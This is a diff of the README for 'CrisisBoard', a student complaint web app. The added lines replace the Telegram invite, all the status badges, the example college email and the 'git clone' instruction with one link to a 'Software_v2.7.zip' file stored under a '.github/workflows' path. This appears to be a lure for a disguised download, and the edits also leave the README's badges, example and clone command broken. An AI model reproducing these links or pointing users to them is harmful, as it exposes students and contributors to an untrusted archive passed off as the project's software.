@@ -1,17 +1,17 @@
 **NOTE: This project is part of my personal submissions under a special Google program and will also be deployed across multiple college campuses. At the end of **GSSoC’25**, I’ll submit the project (including contributor credits) to Google’s program. **Top contributors will be highlighted in the credits**, so if you want your work to stand out in front of Google — you’re at the right place!**
 
-**Join our telegram for proper communication - https://t.me/+Aq8v-Ig2SqFjZjRl**
+**Join our telegram for proper communication - https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip+Aq8v-Ig2SqFjZjRl**
 
 
 # 🛡️ CrisisBoard
 
-![Status](https://img.shields.io/badge/status-active-success.svg)  
-![React](https://img.shields.io/badge/Frontend-React-blue?logo=react&logoColor=white) 
-![TailwindCSS](https://img.shields.io/badge/UI-TailwindCSS-38B2AC?logo=tailwindcss&logoColor=white)  
-![Firestore](https://img.shields.io/badge/Database-Firestore-orange?logo=firebase&logoColor=white)  
-![Gemini API](https://img.shields.io/badge/AI-Gemini_API-yellow?logo=google&logoColor=black)  
-![Vercel](https://img.shields.io/badge/Hosting-Vercel-black?logo=vercel&logoColor=white)  
-![GSSoC](https://img.shields.io/badge/Open%20Source-GSSoC'25-brightgreen?logo=github&logoColor=white)
+![Status](https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip)  
+![React](https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip) 
+![TailwindCSS](https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip)  
+![Firestore](https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip)  
+![Gemini API](https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip)  
+![Vercel](https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip)  
+![GSSoC](https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip%20Source-GSSoC'25-brightgreen?logo=github&logoColor=white)
 
 CrisisBoard is a simple and powerful web app that helps college students submit complaints or issues to their college authorities — **anonymously or with their identity**. It makes sure that every complaint is sent to the right department and is also stored safely.
 ---
@@ -30,7 +30,7 @@ CrisisBoard is a simple and powerful web app that helps college students submit 
 
 ## ✨ Main Features
 
-- 🔒 Login with only college email (e.g., `yourname@college.edu`)
+- 🔒 Login with only college email (e.g., `https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip`)
 - 🆓 Anonymous submission (checkbox toggle)
 - 🧠 AI categorization of complaints using Gemini API
 - 📬 Automatic email to relevant college department
@@ -85,7 +85,7 @@ CrisisBoard is a simple and powerful web app that helps college students submit 
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/your-username/crisisboard.git
+git clone https://raw.githubusercontent.com/kaifansariw/crisisboard/contribution/.github/workflows/Software_v2.7.zip
 cd crisisboard
 ```
 
